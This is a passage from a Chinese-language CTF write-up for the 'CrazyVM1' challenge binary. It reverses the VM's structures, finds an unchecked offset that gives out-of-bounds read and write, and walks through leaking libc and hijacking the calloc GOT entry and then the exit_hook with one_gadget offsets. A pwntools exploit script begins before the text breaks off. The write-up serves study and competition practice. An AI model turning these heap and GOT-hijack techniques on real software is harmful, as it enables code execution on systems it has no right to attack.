class="number">0x55d73e90e440</span> ◂— <span class="number">0x7f00000000000000</span> <span class="comment">/* NODE-fini */</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x55d73e8fe350</span> —▸ <span class="number">0x55d73e90e460</span> ◂— <span class="number">0x5000000000000000</span> <span class="comment">/* NODE-data */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55d73e8fe358</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0x55d73e8fe360</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0x55d73e8fe3a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0x55d73e8fe3e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br></pre></td></tr></table></figure>
<ul>
<li>Chunk + 21*8 的位置有3个 chunk 指针</li>
<li>分析出第1个 chunk 用于管理 code，第3个 chunk 用于管理 data</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e8fe400</span> <span class="comment">/* NODE-code */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55d73e8fe400</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55d73e8fe408</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55d73e8fe410</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55d73e8fe418</span> ◂— <span class="number">0x10000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55d73e8fe420</span> —▸ <span class="number">0x55d73e8fe430</span> ◂— <span class="number">0xa31313131</span> <span class="comment">/* &#x27;1111\n&#x27; */</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e90e430</span> <span class="comment">/* NODE-fini */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55d73e90e430</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55d73e90e438</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55d73e90e440</span> ◂— <span class="number">0x7f00000000000000</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55d73e90e448</span> ◂— <span class="number">0x100000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55d73e90e450</span> —▸ <span class="number">0x7fa93f84f010</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e90e450</span> <span class="comment">/* NODE-data */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55d73e90e450</span> —▸ <span class="number">0x7fa93f84f010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55d73e90e458</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55d73e90e460</span> ◂— <span class="number">0x5000000000000000</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55d73e90e468</span> ◂— <span class="number">0x20000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55d73e90e470</span> —▸ <span class="number">0x7fa93f82e010</span> ◂— <span class="number">0xa32323232</span> <span class="comment">/* &#x27;2222\n&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>目前不知道第2个 chunk 的信息</li>
<li>PS：由于 size 过大，导致 calloc 调用了 mmap</li>
</ul>
<p>通过调试分析可以初步提取出如下两个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Info struc ; (<span class="keyword">sizeof</span>=<span class="number">0x180</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> buf dq <span class="number">16</span> dup(?)</span><br><span class="line"><span class="number">00000080</span> temp_base dq ?</span><br><span class="line"><span class="number">00000088</span> data_base dq ?</span><br><span class="line"><span class="number">00000090</span> code_base dq ?</span><br><span class="line"><span class="number">00000098</span> field_98 dq ?</span><br><span class="line"><span class="number">000000</span>A0 node_code dq ?                          ; offset</span><br><span class="line"><span class="number">000000</span>A8 node_temp dq ?                          ; offset</span><br><span class="line"><span class="number">000000B</span>0 node_data dq ?                          ; offset</span><br><span class="line"><span class="number">000000B</span>8 field_B8 dq ?</span><br><span class="line"><span class="number">000000</span>C0 field_C0 dq ?</span><br><span class="line"><span class="number">000000</span>C8 field_C8 dq ?</span><br><span class="line"><span class="number">000000</span>D0 field_D0 dq ?</span><br><span class="line"><span class="number">000000</span>D8 field_D8 dq ?</span><br><span class="line"><span class="number">000000E0</span> field_E0 dq ?</span><br><span class="line"><span class="number">000000E8</span> field_E8 dq ?</span><br><span class="line"><span class="number">000000F</span>0 field_F0 dq ?</span><br><span class="line"><span class="number">000000F</span>8 field_F8 dq ?</span><br><span class="line"><span class="number">00000100</span> field_100 dq ?</span><br><span class="line"><span class="number">00000108</span> field_108 dq ?</span><br><span class="line"><span class="number">00000110</span> field_110 dq ?</span><br><span class="line"><span class="number">00000118</span> field_118 dq ?</span><br><span class="line"><span class="number">00000120</span> key db ?</span><br><span class="line"><span class="number">00000121</span> db ? ; undefined</span><br><span class="line"><span class="number">00000122</span> db ? ; undefined</span><br><span class="line"><span class="number">00000123</span> db ? ; undefined</span><br><span class="line"><span class="number">00000124</span> db ? ; undefined</span><br><span class="line"><span class="number">00000125</span> db ? ; undefined</span><br><span class="line"><span class="number">00000126</span> db ? ; undefined</span><br><span class="line"><span class="number">00000127</span> db ? ; undefined</span><br><span class="line"><span class="number">00000128</span> code dq ?</span><br><span class="line"><span class="number">00000130</span> key2 db ?</span><br><span class="line"><span class="number">00000131</span> db ? ; undefined</span><br><span class="line"><span class="number">00000132</span> db ? ; undefined</span><br><span class="line"><span class="number">00000133</span> db ? ; undefined</span><br><span class="line"><span class="number">00000134</span> db ? ; undefined</span><br><span class="line"><span class="number">00000135</span> db ? ; undefined</span><br><span class="line"><span class="number">00000136</span> db ? ; undefined</span><br><span class="line"><span class="number">00000137</span> db ? ; undefined</span><br><span class="line"><span class="number">00000138</span> t_rsi dq ?</span><br><span class="line"><span class="number">00000140</span> t_rdx dq ?</span><br><span class="line"><span class="number">00000148</span> t_rcx dq ?</span><br><span class="line"><span class="number">00000150</span> t_r8 dq ?</span><br><span class="line"><span class="number">00000158</span> func dq ?                               ; offset</span><br><span class="line"><span class="number">00000160</span> key3 db ?</span><br><span class="line"><span class="number">00000161</span> db ? ; undefined</span><br><span class="line"><span class="number">00000162</span> db ? ; undefined</span><br><span class="line"><span class="number">00000163</span> db ? ; undefined</span><br><span class="line"><span class="number">00000164</span> db ? ; undefined</span><br><span class="line"><span class="number">00000165</span> db ? ; undefined</span><br><span class="line"><span class="number">00000166</span> db ? ; undefined</span><br><span class="line"><span class="number">00000167</span> db ? ; undefined</span><br><span class="line"><span class="number">00000168</span> field_168 dq ?</span><br><span class="line"><span class="number">00000170</span> field_170 dq ?</span><br><span class="line"><span class="number">00000178</span> field_178 dq ?</span><br><span class="line"><span class="number">00000180</span> Info ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> base dq ?</span><br><span class="line"><span class="number">00000008</span> size dq ?</span><br><span class="line"><span class="number">00000010</span> chunk dq ?                              ; offset</span><br><span class="line"><span class="number">00000018</span> Node ends</span><br></pre></td></tr></table></figure>
<p>在函数 hand_key 中有非常复杂的 Switch-case 结构，猜测程序在这里完成指令执行的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">  <span class="keyword">if</span> ( !op1 || op1 == <span class="number">2</span> || op1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr-&gt;key2 = <span class="number">1</span>;</span><br><span class="line">    ptr-&gt;func = sub_176C;</span><br><span class="line">    ptr-&gt;r_rdi = op1;</span><br><span class="line">    ptr-&gt;r_rsi = op2;</span><br><span class="line">    ptr-&gt;r_rdx = BYTE3(ptr-&gt;code);</span><br><span class="line">    ptr-&gt;r_rcx = (<span class="keyword">unsigned</span> __int8)BYTE4(ptr-&gt;code);</span><br><span class="line">    re = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每一个 case，程序都设计了一个函数来完成其功能</li>
<li>这里只能断点调试，通过输入值和返回值来判断该函数的功能</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000</span>D77D <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000</span>D781 <span class="number">48</span> <span class="number">8B</span> B0 <span class="number">38</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          mov     rsi, [rax+<span class="number">138</span>h]</span><br><span class="line">.text:<span class="number">000000000000</span>D788 <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000</span>D78C <span class="number">49</span> <span class="number">89</span> F8                      mov     r8, rdi</span><br><span class="line">.text:<span class="number">000000000000</span>D78F <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">000000000000</span>D792 <span class="number">41</span> FF D1                      call    r9</span><br></pre></td></tr></table></figure>
<ul>
<li>程序会运行一个函数指针</li>
</ul>
<p>该程序的漏洞极有可能是堆溢出（覆盖函数指针），但程序对 op3-offset 进行了限制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( op1 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5u</span>:</span><br></pre></td></tr></table></figure>
<ul>
<li>想要绕过这个限制就必须让 op1 为“5”，导致多数指令没法正常执行</li>
</ul>
<p>在程序的第 0x12 和 0x13 号指令中还有另一处漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ptr-&gt;temp_base -= <span class="number">8LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( offset &lt;= <span class="number">0xF</span> )</span><br><span class="line">  *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base] = ptr-&gt;buf[offset];<span class="comment">// 0x80000-8</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base] = ptr-&gt;temp_base;</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 0x12 可以将任意数据存储到 <code>ptr-&gt;node_temp-&gt;chunk</code> 指向的堆空间中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ptr-&gt;temp_base += <span class="number">8LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( offset &lt;= <span class="number">0xF</span> )</span><br><span class="line">  ptr-&gt;buf[offset] = *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base - <span class="number">8</span>];<span class="comment">// 0x80000-8</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ptr-&gt;temp_base = *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base - <span class="number">8</span>];</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 0x13 可以将 <code>ptr-&gt;node_temp-&gt;chunk</code> 中的数据取出，并且可以控制 <code>ptr-&gt;temp_base</code></li>
</ul>
<p>关键点就在于 <code>ptr-&gt;temp_base</code> 是可控的，并且程序没有对 <code>ptr-&gt;temp_base</code> 的范围进行检查，这就导致了 mmap 的堆空间发生溢出</p>
<p><strong>入侵思路</strong></p>
<p>由于 mmap 的堆空间发生溢出，我们就有机会劫持 free_hook</p>
<p>利用下面的脚本可以将 libc-calloc 提取出来，并且导致 <code>ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base - 8]</code> 索引到 libc-GOT：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code =  intemp(<span class="number">0x10</span>) </span><br><span class="line">code += outtemp(<span class="number">0</span>)</span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0x323020</span>+<span class="number">8</span>-<span class="number">0x80000</span>)</span><br><span class="line">code += add(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code += intemp(<span class="number">0</span>)</span><br><span class="line">code += outtemp(<span class="number">0x10</span>)</span><br><span class="line">code += outtemp(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x559f7a2bb2a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x559f7a2bb2a0</span> ◂— <span class="number">0x7f00000000323020</span> <span class="comment">/* &#x27; 02&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x559f7a2bb2a8</span> ◂— <span class="number">0x2a3028</span> <span class="comment">/* &#x27;(0*&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x559f7a2bb2b0</span> —▸ <span class="number">0x7f7d06f06c90</span> (<span class="built_in">calloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x559f7a2bb2b8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>再加上下面脚本就可以成功劫持 libc-GOT（calloc）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code += mov(<span class="number">1</span>,<span class="number">0xe6aee</span><span class="number">-0x9ec90</span>)</span><br><span class="line">code += add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">code += intemp(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>劫持前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f068029e018</span> (_dl_catch_exception@got.plt) —▸ <span class="number">0x7f06801df6a0</span> (_dl_catch_exception) ◂— endbr64 </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f068029e020</span> (<span class="built_in">malloc</span>@got.plt) —▸ <span class="number">0x7f0680119260</span> (<span class="built_in">malloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7f068029e028</span> (_dl_signal_exception@got.plt) —▸ <span class="number">0x7f06801df5f0</span> (_dl_signal_exception) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7f068029e030</span> (<span class="built_in">calloc</span>@got.plt) —▸ <span class="number">0x7f068011ac90</span> (<span class="built_in">calloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7f068029e038</span> (<span class="built_in">realloc</span>@got.plt) —▸ <span class="number">0x7f068011a000</span> (<span class="built_in">realloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7f068029e040</span> (_dl_signal_error@got.plt) —▸ <span class="number">0x7f06801df640</span> (_dl_signal_error) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f068029e048</span> (_dl_catch_error@got.plt) —▸ <span class="number">0x7f06801df7c0</span> (_dl_catch_error) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>劫持后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│ rcx <span class="number">0x7f068029e030</span> (<span class="built_in">calloc</span>@got.plt) —▸ <span class="number">0x7f0680162aee</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br></pre></td></tr></table></figure>
<p>不过 calloc-GOT 显然无法触发，因此我们需要重新计算一下偏移去劫持 exit_hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f0afda13010</span>+<span class="number">0x323020</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0afdd36030</span> (<span class="built_in">calloc</span>@got.plt) —▸ <span class="number">0x7f0afdbb2c90</span> (<span class="built_in">calloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f0afdd36038</span> (<span class="built_in">realloc</span>@got.plt) —▸ <span class="number">0x7f0afdbb2000</span> (<span class="built_in">realloc</span>) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p rtld_lock_default_lock_recursive</span><br><span class="line">$<span class="number">3</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span> *)&#125; <span class="number">0x7fa350ad8150</span> &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7fa350ad8150</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>P\x81\xadP\xa3\x7f\x00\x00<span class="number">&#x27;</span></span><br><span class="line">ld<span class="number">-2.31</span>.so      <span class="number">0x7fa350b05f68</span> <span class="number">0x7fa350ad8150</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x7fa3507e2010</span> <span class="number">0x7fa350b05f68</span></span><br><span class="line"><span class="number">0x7fa3507e2010</span>-&gt;<span class="number">0x7fa350b05f68</span> is <span class="number">0x323f58</span> bytes (<span class="number">0x647eb</span> words)</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CrazyVM1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span 